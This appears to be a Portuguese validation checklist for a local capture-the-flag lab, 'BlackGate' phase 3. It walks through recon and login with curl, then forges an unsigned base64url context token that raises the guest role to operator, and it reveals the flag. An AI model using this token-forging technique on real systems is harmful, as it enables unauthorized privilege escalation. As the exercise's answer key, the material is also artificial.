# Validação - Lab 05 BlackGate - Fase 3

## Escopo

```text
http://localhost:8096
```

## Subir o lab

```bash
cd lab-05-blackgate
docker compose up --build
```

Em outro terminal:

```bash
docker compose ps
```

Resultado esperado:

- serviço `blackgate` em execução;
- porta `8096:3000`.

## Health e recon público

```bash
curl -i http://localhost:8096/health
curl -i http://localhost:8096/robots.txt
curl -i http://localhost:8096/.well-known/security.txt
curl -i http://localhost:8096/api/status
curl -i http://localhost:8096/api/version
curl -i http://localhost:8096/api/client-config
curl -i http://localhost:8096/api/routes
curl -i http://localhost:8096/debug/ping
curl -i -H "X-Debug-Token: guest-debug" http://localhost:8096/debug/ping
```

Resultado esperado:

- endpoints antigos continuam respondendo;
- `/health` retorna `1.2.0-phase3`;
- `/api/version` retorna build `bg-phase3-weak-token`;
- debug com header retorna diagnostics de contexto limitados;
- nenhum segredo real é exposto em rota pública.

## Login por terminal

```bash
rm -f /tmp/bg-cookie.txt

curl -i -c /tmp/bg-cookie.txt \
  -d "username=guest" \
  -d "password=guest123" \
  -X POST http://localhost:8096/login
```

Resultado esperado:

- HTTP 302;
- `Set-Cookie`;
- redirecionamento para `/dashboard`.

## Obter token de contexto

```bash
curl -i -b /tmp/bg-cookie.txt http://localhost:8096/api/context/me
```

Resultado esperado:

- JSON com usuário `guest`;
- role `guest`;
- scope `limited`;
- campo `context_token`.

## Validar bloqueios

Sem token:

```bash
curl -i -b /tmp/bg-cookie.txt http://localhost:8096/api/operator/briefing
```

Token guest padrão:

```bash
GUEST_TOKEN=$(node -e 'const p={user:"guest",role:"guest",scope:"limited",issued_by:"legacy-context-service"}; console.log(Buffer.from(JSON.stringify(p)).toString("base64url"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $GUEST_TOKEN" \
  http://localhost:8096/api/operator/briefing
```

Resultado esperado:

- sem token: erro `bad_request`;
- token guest: erro `forbidden`.

## Gerar token manipulado

```bash
TOKEN=$(node -e 'const p={user:"guest",role:"operator",scope:"operations",issued_by:"legacy-context-service"}; console.log(Buffer.from(JSON.stringify(p)).toString("base64url"))')
echo "$TOKEN"
```

## Verificar token manipulado

```bash
curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  -X POST http://localhost:8096/api/context/verify
```

Resultado esperado:

- `valid: true`;
- role `operator`;
- scope `operations`.

## Acessar briefing operator

```bash
curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  http://localhost:8096/api/operator/briefing
```

Resultado esperado:

- HTTP 200;
- finding `weak unsigned context token`;
- flag `FLAG{blackgate_weak_token_role_escalation_phase3}`.

## Acessar metadata operator

```bash
curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  http://localhost:8096/api/operator/gateway-metadata
```

Resultado esperado:

- gateway `gw-blackgate.local`;
- trusted upstream `api-core.internal`;
- hint de Fase 4;
- sem SSRF real.

## Rotas autenticadas no navegador

Após login, validar:

```text
/dashboard
/context
/tickets
/assets
/security-policy
/logout
```

## Docker

Conferir:

```bash
grep -n "8096:3000" docker-compose.yml
grep -n "ports:" docker-compose.yml
```

Resultado esperado:

- porta pública `8096:3000`;
- somente o serviço web exposto.
